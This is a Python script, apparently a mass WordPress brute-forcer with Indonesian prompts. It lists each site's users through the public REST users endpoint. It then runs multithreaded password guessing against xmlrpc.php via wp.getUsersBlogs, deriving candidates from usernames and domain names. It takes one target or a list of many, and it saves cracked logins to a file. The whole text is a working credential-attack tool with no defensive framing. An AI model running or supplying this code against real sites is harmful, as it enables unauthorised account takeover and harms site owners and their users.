try:
	import requests as r, os, sys, json, re, rich
	from concurrent.futures import ThreadPoolExecutor as pol
except Exception as e:
	exit("[>] Error: "+str(e)+"\n")

clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"user-agent": "chrome", "User-Agent": "chrome"}

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def Privword():
	tnya = input("> Wordlist Manual/Auto? [M/A]: ")
	while tnya not in list("MmAa"):
		print(" * Pilihan tidak tersedia..")
		tnya = input("> Wordlist Manual/Auto? [D/A]: ")
	if tnya in list("Mm"):
		while True:
			file = input("> Wordlist File: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				return cek; break
			except:
				print("* File tidak ditemukan")
	else:
		ckck = open("assets/top_pass.txt","r").read().strip().split("\n")
		return ckck

def runCrack(url, user, pws):
	global header
	usegx = re.findall("www.([^./]+)" if "www." in url else "https?://([^./]+)", url)[0]
	group_domain = re.findall("www.([^/]+)" if "www." in url else "https?://([^/]+)", url)[0].replace(".","")
	head = {"Content-Type": "text/xml", "User-Agent": "chrome"}
	sis = 0
	for ps in pws:
		ps = (ps.replace("[WPLOGIN]", user).replace("[DDOMAIN]", group_domain)
			.replace("[DOMAIN]", usegx)
			.replace("[UPPERALL]", user.upper())
			.replace("[LOWERALL]", user.lower())
			.replace("[UPPERONE]", user.capitalize())
			.replace("[LOWERONE]", user[0].lower() + user[1::].upper())
			.replace("[AZDOMAIN]", group_domain)
			.replace("[UPPERLOGIN]", user.capitalize())
		)
		payload = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (user, ps)
		pos = r.post(url+"/xmlrpc.php", headers=head, data=payload, timeout=15)
		if "isAdmin" in str(pos.content):
			sis += 1
			rich.print("  [bold green]-> success:[/] [bold white]"+url+"/wp-login.php#"+user+"@"+ps+"[/]")
			writer("wpcrack.txt", url+"/wp-login.php#"+user+"@"+ps)
			break
		else:
			rich.print("  [bold red]-> failed :[/] [bold white]"+url+"/wp-login.php#"+user+"@"+ps+"[/]")
		if sis != 0:
			break

def gassCrack(url, dataPw):
	global header
	try:
		check = r.get(url+"/wp-json/wp/v2/users", headers=header(), allow_redirects=True, timeout=10)
		if check.status_code == 200:
			user = [x["slug"] for x in check.json()]
		else:
			user = []
	except:
		user = []

	if len(user) != 0:
		url = re.findall("(https?://[^/]+)", check.url)[0]
		with pol(max_workers=10) as pul:
			for usr in user:
				pul.submit(runCrack, url, usr, dataPw)
def main():
	print("""
	[ WORDPRESS BRUTEFORCE ]
""")
	tnya = input("> Bruteforce Target/Massal [T/M]: ")
	while tnya not in list("TtMm"):
		tnya = input("> Bruteforce Target/Massal [T/M]: ")
	if tnya in list("Tt"):
		target = input("> Target website: ")
		while target == "":
			target = input("> Target website: ")
		dataPw = Privword()
		url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", target)]
	else:
		while True:
			fls = input("> List file target: ")
			try:
				trg = open(fls, "r").read().strip().split("\n")
				break
			except:
				print("* File tidak tersedia")
		dataPw = Privword()
		url = []
		for x in trg:
			try:
				asu = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", x)][0]
				url.append(asu)
			except:
				pass
	print("! please wait, process..\n")
	for xr in url:
		gassCrack(xr, dataPw)
	print("\n! Selesai..")


if __name__=="__main__":
	clear()
	main()
